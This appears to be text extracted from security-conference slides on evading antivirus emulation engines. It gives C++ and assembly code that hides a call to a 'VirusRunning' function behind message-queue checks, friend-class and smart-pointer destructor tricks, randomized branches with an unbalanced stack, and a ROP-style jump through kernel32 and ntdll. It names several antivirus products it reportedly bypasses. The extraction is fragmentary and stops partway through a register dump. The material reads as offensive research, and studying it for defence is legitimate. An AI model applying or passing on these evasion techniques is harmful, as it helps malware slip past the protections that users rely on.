• …
• DEMO TIME
Unknown MSG
• HWND hWnd = CreateWindowEx(NULL, L"button", NULL, 
WS_OVERLAPPEDWINDOW, 0, 0, 0, 0, NULL, NULL, 0, NULL);
• MSG Msg;
• GetMessage(&Msg, hWnd, 0,0)
• Msg.message = >   ?? 
• If(Msg.message == 0x31f)  // first message in the queue 
•
VirusRunning();      // bypass AV-Emulator 
Unknown MSG
• HWND hWnd = CreateWindowEx(NULL, L"button", NULL, WS_OVERLAPPEDWINDOW, 0, 0, 0, 
0, NULL, NULL, 0, NULL);
• CreateCaret(hWnd,0,0,0);  
• or
• Flashwindow(hWnd,true);
• MSG Msg;
• GetMessage(&Msg, hWnd, 0,0)
• Msg.message = >   ?? 
• If(Msg.message == 0x118)  // process a WM_SYSTEMTIMER message
•
VirusRunning();          // bypass AV-Emulator
Advanced Exploitation Techniques
• C++ provides friend class
• It provides variable access protection on compiler level 
• It makes the process of object construction complicated and hard for AV-
Emulator to simulate on the binary level
class CExploitA : public CInterface
{
public: 
int m_pointer;
friend class CExploitB;
private:
PROC m_caller;
PROC Change()
{
m_caller = (PROC)m_pointer;
return m_caller;
}
};
Exploiting C++ advanced syntactic features 
• It provides variable access protection on compiler level 
• It makes the process of object construction complicated and hard for AV-
Emulator to simulate on the binary level
class CExploitB : public CInterface
{
public:
int m_pointer;
virtual int GetPointer() { return 
m_pointer; }
int CallRunVirus(CExploitA &A)
{
PROC call = A.Change();
call();
return TRUE;
}
}
Void Test_VM()
{
CExploitA *a = new CExploitA;
a->SetPointer((int)(PROC)VirusRunning);
CExploitB *b = new CExploitB;
b->CallRunVirus(*a);   //the virus code will be running
}
Exploiting C++ advanced syntactic features 
• It provides variable access protection on compiler level 
• It makes the process of object construction complicated and hard for AV-
Emulator to simulate on the binary level
v2 = operator new(0x14u);
if ( v2 )
{
*((_DWORD *)v2 + 1) = -1718123434;
*((_DWORD *)v2 + 2) = 0x7FFFFFFF;
*((_DWORD *)v2 + 4) = 0;
*(_DWORD *)v2 = &CExploitB::`vftable';
}
(*(void (__thiscall **)(void *, void (__cdecl *)()))(*(_DWORD *)v1 + 8))(v1, VirusRunning);
v3 = (void (*)(void))*((_DWORD *)v1 + 2);
*((_DWORD *)v1 + 5) = v3;
v3();
return 1;
Exploiting C++ advanced syntactic features 
Bypass 
• Norman Suite 11
• Bitdefender Anti-virus2016 
• ESET Smart Seurity8 
• VBA32
• …
Essentially, any of advanced semantic feature have 
abilities to negatively affect AV-Emulator technology, 
such as smart pointer, C++ exception ...
DEMO TIME
Exploiting C++ advanced syntactic features 
1.
Class object stores in smart pointer.
2.
The object’s destructor would be called when the lifecycle of smart pointer ends.
3.
Malicious function would be called within the object’s destructor. 
Void TestVM(){
shared_ptr  myptr(new CExploitC);
myptr->SetPointer((int)(PROC)VirusRunning);
return  ;
｝
class CExploitC : public CInterface{
public:   CExploitC::~CExploitC() { 
m_call();}
virtual int SetPointer(int pointer){ m_call = (PROC)pointer;
return m_pointer;}
};
Exploiting C++ advanced syntactic features 
Using a smart pointer lifecycle to execute malicious functions when 
destructor releases resources 
Bypass Kaspersky KIS2016
{ ..                                
LOBYTE(v11) = 2;          
a[0] = 0;
a[1] = 0;
*(_DWORD *)std::shared_ptr::operator->(&myptr)->m_pointer = 0;
v3 = 1;
v11 = -1;
std::shared_ptr::~shared_ptr(&myptr);
return v3;}
Advanced Exploitation Techniques
1) Randomized conditional branch generation could possibly trap the 
AV-Emulator into false branch, therefore no malicious behavior is 
triggered.
We need to search specific APIs which return random values, such as 
BOOL WINAPI FindFirstFreeAce(
_In_   PACL    pAcl, // When invoked ,the pAc will be modified
_Out_  LPVOID *pAce
);
UINT WINAPI MapVirtualKey(   //When invoked ,will return a value which is random integer
_In_ UINT uCode,
_In_ UINT uMapType);
Randomized Conditional Branch
2)We write a custom function and make the stack unbalanced on purpose.
3）The combination of unbalanced stack and crafted conditional branch would make 
AV-Emulator jump into a branch which no malicious is triggered.
We need to search specific APIs which return random values, such as 
BOOL WINAPI FindFirstFreeAce(
_In_   PACL          pAcl, // The pAc would be modified after invoked  
_Out_   LPVOID       *pAce
);
UINT WINAPI MapVirtualKey(   // This API returns a random value.
_In_ UINT uCode,
_In_ UINT uMapType);
Randomized Conditional Branch
Randomized conditional branch generation could possibly trap the AV_Emulator into 
false branch, therefore no malicious behavior is triggered.
fake_call_A
proc
…
call MapVirtualKey
cmp eax,10h
jg @f 
pop eax
pop ebx
ret
@@:              
ret
fake_call_B
proc
call FindFirstFreeAce
mov eax,offset out_p1
mov ebx,[eax]
cmp eax,ebx
jl @f
pop eax
pop ebx
ret
@@：
ret
main  proc
call fake_call_X
End main
Fake_call_x proc
...
Fake_call_A
End fake_call_X
Randomized Conditional Branch
bypass
• Kaspersky =Kaspersky KIS2013
• Norman Suite 11
• Bitdefender Anti-virus2016 
• ESET Smart Seurity8
• VBA32  
• … 
DEMO TIME
Advanced Exploitation Techniques
Run malicious core code by using the tech like ROP Gadget  
1) The AV-Emulator simulates APIs  
2) Typically, the underlying DLL module like Ntdll doesn’t have to be simulated. 
Such as  
Kernel32.CreateFile   --- >  ntdll.NtCreateFile
3） Ntdll module is not loaded into simulate environment of AV-Emulator 
4)  The AV-Emulator is not able to detect the malicious function which is called 
from the ‘ret’ instruction within Ntdll module.
Simulate ROP ways to execute core code 
Simulate ROP ways to execute core code -
windows 7 X86 SP1
EOP：
EAX 75443368 kernel32.BaseThreadInitThunk
ECX 00000000
EDX 004014AA bypasses.
EBX 7EFDE000
ESP 0018FF8C ASCII "z3Du"
EBP 0018FF94
ESI 00000000
EDI 00000000
EIP 004014AA bypasses. 
1)Acquire kernel32 module base 
address by accessing EAX 
2)Search a statement from kernel32 
module, which can be used to call 
Ntdll.
77E15947   FF15 8412DE77    CALL DWORD PTR 
DS:[; 
77E1594D   3BC3              CMP EAX,EBX
Simulate ROP ways to execute core code 
Simulate ROP ways to execute core code - windows 7 X86 SP1
EOP：
EAX 75443368 kernel32.BaseThreadInitThunk
ECX 00000000
EDX 004014AA bypasses.
EBX 7EFDE000
ESP 0018FF8C ASCII "z3Du"
EBP 0018FF94
ESI 00000000
EDI 00000000
EIP 004014AA bypasses. 
3）Calculate base address of Ntdll module 
by using QueryInformationToken address
4）
Push the address of function 
VirusRunning onto stack.
add edx,0x29e
push VirusRunning
push edi
push esi
push ebx
jmp  edx // jump a gadget
Simulate ROP ways to execute core code 
Simulate ROP ways to execute core code - windows 7 X86 SP1
EOP：
EAX 75443368 kernel32.BaseThreadInitThunk
ECX 00000000
EDX 004014AA bypasses.
EBX 7EFDE000
ESP 0018FF8C ASCII "z3Du"
EBP 0018FF94
ESI 00000000